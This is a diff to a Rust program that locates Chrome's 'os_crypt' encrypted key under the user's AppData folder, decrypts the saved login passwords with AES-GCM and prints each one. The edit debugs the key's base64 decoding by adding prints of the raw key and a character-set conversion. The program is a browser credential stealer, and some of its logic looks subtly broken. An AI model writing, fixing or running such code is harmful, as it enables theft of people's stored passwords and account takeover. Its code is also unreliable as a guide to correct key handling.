@@ -11,6 +11,8 @@ use aes_gcm::{
 use aes_gcm::aead::consts::U12;
 use aes_gcm::aead::generic_array::GenericArray;
 use base64::{Engine as _, engine::general_purpose};
+use encoding::{Encoding, DecoderTrap, EncoderTrap};
+
 
 // C:\Users\Admin\AppData\Local\Google\Chrome\User Data
 fn retrieve_secret_key() -> String {
@@ -27,9 +29,13 @@ fn retrieve_secret_key() -> String {
             .expect("Unable to get JSON content");
 
         let key = json_content["os_crypt"]["encrypted_key"].to_string();
+        println!("{}", key);
+
+        let base64_string = String::from_utf8(windows1252_to_utf8(key)).expect("Cannot build UTF-8");
+        println!("{}", base64_string);
 
         // fix the base64 decoding
-        return String::from_utf8(general_purpose::PAD.decode(key).unwrap()).expect("Cannot decode key.");
+        return String::from_utf8(general_purpose::STANDARD_NO_PAD.decode( base64_string).unwrap()).expect("Cannot decode key.");
     }
     println!("Unable to find the secret key.");
     exit(1);
@@ -73,8 +79,6 @@ fn get_user_db(secret_key : String) -> () {
             println!("Decrypted password: {}", String::from_utf8(plaintext).expect("UTF-8 Conversion Failed"));
 
             println!("----------------------------------------------------------");
-
-
 
         }
 
